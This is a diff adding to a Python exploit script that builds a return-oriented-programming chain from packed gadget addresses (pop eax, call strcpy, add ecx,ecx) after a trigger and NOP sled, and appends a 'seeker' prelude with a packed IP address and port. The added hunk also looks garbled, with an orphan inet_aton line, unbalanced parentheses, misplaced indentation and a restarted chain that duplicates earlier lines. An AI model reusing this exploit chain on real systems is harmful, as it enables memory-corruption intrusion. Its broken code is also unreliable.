@@ -32,6 +32,26 @@ evil = trigger + nopsled
         parsed += seeker[2] #add the packed port
         parsed += struct.pack(">I", 0x8fe24b3c) #add ecx,ecx # ret
         parsed += struct.pack(">I", 0x8fe2c71d) #mov eax,edx # ret
+            
+        socket.inet_aton(str(address[1]))) #port bytes
+        parsed =  struct.pack(">I", 0x8fe2fb63) #pop eax
+        parsed += struct.pack(">I", 0x8fe2fb58) #push esp
+        parsed += struct.pack(">I", 0xffff1d6b) #add esp,byte +0x1c # pop ebp # ret
+        parsed += struct.pack(">I", 0x8fe2db10) #call strcpy
+        parsed += struct.pack(">I", 0x8fe2dfd1) #POP - POP - RET over strcpy params
+        parsed += struct.pack(">I", 0x8fe2dae4) #mov ecx,[esp+0x4] # add eax,edx # sub eax,ecx # ret
+        parsed += struct.pack(">I", 0x8fe2b3d4) #POP - RET
+        parsed += struct.pack(">I", 0xffffffff) #value to store in ecx
+        parsed += struct.pack(">I", 0x8fe0c0c7) #inc ecx # xor al,0xc9
+        parsed += struct.pack(">I", 0x8fe0c0c7) #inc ecx # xor al,0xc9
+        parsed += struct.pack(">I", 0x8fe24b3c) #add ecx,ecx # ret
+        parsed += struct.pack(">I", 0x8fe24b3c) #add ecx,ecx # ret
+        parsed += struct.pack(">I", 0x8fe24b3c) #add ecx,ecx # ret
+        parsed += seeker[0] #add the prelude
+        parsed += seeker[1] #add the packed IP address
+        parsed += seeker[2] #add the packed port
+        parsed += struct.pack(">I", 0x8fe24b3c) #add ecx,ecx # ret
+        parsed += struct.pack(">I", 0x8fe2c71d) #mov eax,edx # ret
 
 # balls
 
